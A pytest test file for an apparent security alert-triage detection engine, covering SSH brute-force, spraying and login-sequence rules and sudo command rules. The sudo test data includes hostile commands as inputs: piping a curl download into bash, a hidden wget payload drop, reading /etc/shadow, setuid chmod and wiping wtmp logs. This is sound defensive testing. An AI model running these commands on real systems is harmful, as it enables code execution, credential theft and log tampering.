import re
from datetime import datetime, timedelta

import pytest

from alerttriage.detect.engine import DetectionEngine, load_rules
from alerttriage.schema import Event, EventType

T0 = datetime(2026, 11, 16, 12, 0, 0)


def ev(sec: float, etype: EventType, line: int, **kw) -> Event:
    return Event(timestamp=T0 + timedelta(seconds=sec), host="web01", source="auth",
                 process="sshd", event_type=etype, raw=f"line {line}", line_no=line, **kw)


def fails(n: int, ip="203.0.113.9", user="root", gap=2.0, start=0.0, line0=0):
    return [ev(start + i * gap, EventType.SSH_LOGIN_FAILED, line0 + i, user=user, src_ip=ip)
            for i in range(n)]


@pytest.fixture(scope="module")
def engine():
    return DetectionEngine()


def rule_ids(alerts):
    return sorted(a.rule_id for a in alerts)


# ---------------------------------------------------------------- rule files
def test_rules_load_and_have_mitre_ids():
    rules = load_rules()
    assert len(rules) == 15
    for r in rules:
        assert re.fullmatch(r"T\d{4}(\.\d{3})?", r.mitre["technique"]), r.id
        assert r.mitre["tactic"] and r.mitre["name"]


# ---------------------------------------------------------------- threshold
def test_brute_force_fires_once_per_burst(engine):
    alerts = [a for a in engine.run(fails(40)) if a.rule_id == "AT-001"]
    assert len(alerts) == 1                      # 40 attempts -> ONE alert, not 4
    assert alerts[0].event_count == 40           # later attempts are absorbed
    assert alerts[0].fired_at == T0 + timedelta(seconds=18)  # 10th attempt


def test_below_threshold_no_alert(engine):
    assert "AT-001" not in rule_ids(engine.run(fails(9)))


def test_slow_attempts_outside_window_no_alert(engine):
    assert "AT-001" not in rule_ids(engine.run(fails(20, gap=30)))  # 10 attempts span 270s


def test_password_spray_counts_distinct_users(engine):
    events = [ev(i * 20, EventType.SSH_INVALID_USER, i, user=u, src_ip="198.51.100.3")
              for i, u in enumerate(["admin", "test", "oracle", "pi", "git"])]
    assert rule_ids(engine.run(events)) == ["AT-002"]
    same_user = [ev(i * 20, EventType.SSH_INVALID_USER, i, user="admin", src_ip="198.51.100.3")
                 for i in range(5)]
    assert engine.run(same_user) == []


def test_distributed_brute_force_groups_by_user(engine):
    events = [ev(i * 10, EventType.SSH_LOGIN_FAILED, i, user="root", src_ip=f"192.0.2.{i}")
              for i in range(8)]
    assert rule_ids(engine.run(events)) == ["AT-015"]


# ---------------------------------------------------------------- sequence
def test_success_after_failures(engine):
    events = fails(5) + [ev(60, EventType.SSH_LOGIN_SUCCESS, 99, user="root",
                            src_ip="203.0.113.9")]
    alerts = engine.run(events)
    assert "AT-003" in rule_ids(alerts)
    seq = next(a for a in alerts if a.rule_id == "AT-003")
    assert 99 in seq.line_nos and seq.event_count == 6


def test_success_after_too_few_failures(engine):
    events = fails(4) + [ev(60, EventType.SSH_LOGIN_SUCCESS, 99, user="bob",
                            src_ip="203.0.113.9")]
    assert "AT-003" not in rule_ids(engine.run(events))


def test_success_from_other_ip_is_not_sequence(engine):
    events = fails(6) + [ev(60, EventType.SSH_LOGIN_SUCCESS, 99, user="bob", src_ip="10.0.0.1")]
    assert "AT-003" not in rule_ids(engine.run(events))


def test_success_after_window_expired(engine):
    events = fails(6) + [ev(4000, EventType.SSH_LOGIN_SUCCESS, 99, user="bob",
                            src_ip="203.0.113.9")]
    assert "AT-003" not in rule_ids(engine.run(events))


# ---------------------------------------------------------------- single / regex rules
@pytest.mark.parametrize("cmd,expected", [
    ("/bin/bash", ["AT-006"]),
    ("/bin/su -", ["AT-006"]),
    ("/bin/bash -c curl -s http://x/y.sh | bash", ["AT-008"]),
    ("/bin/cat /etc/shadow", ["AT-007"]),
    ("/usr/bin/wget -q http://x/kit -O /tmp/.k", ["AT-008"]),
    ("/bin/chmod u+s /usr/bin/find", ["AT-011"]),
    ("/bin/chmod 4755 /tmp/sh", ["AT-011"]),
    ("/bin/chmod 755 /usr/local/bin/tool", []),
    ("/usr/bin/truncate -s 0 /var/log/wtmp", ["AT-012"]),
    ("/usr/bin/crontab -e", ["AT-010"]),
    ("/usr/bin/apt update", []),
    ("/usr/bin/tail -n 100 /var/log/syslog", []),
])
def test_sudo_command_rules(engine, cmd, expected):
    e = ev(0, EventType.SUDO_COMMAND, 0, user="carol", command=cmd)
    assert rule_ids(engine.run([e])) == expected


def test_root_ssh_login(engine):
    e = ev(0, EventType.SSH_LOGIN_SUCCESS, 0, user="root", src_ip="10.0.0.5")
    assert rule_ids(engine.run([e])) == ["AT-014"]
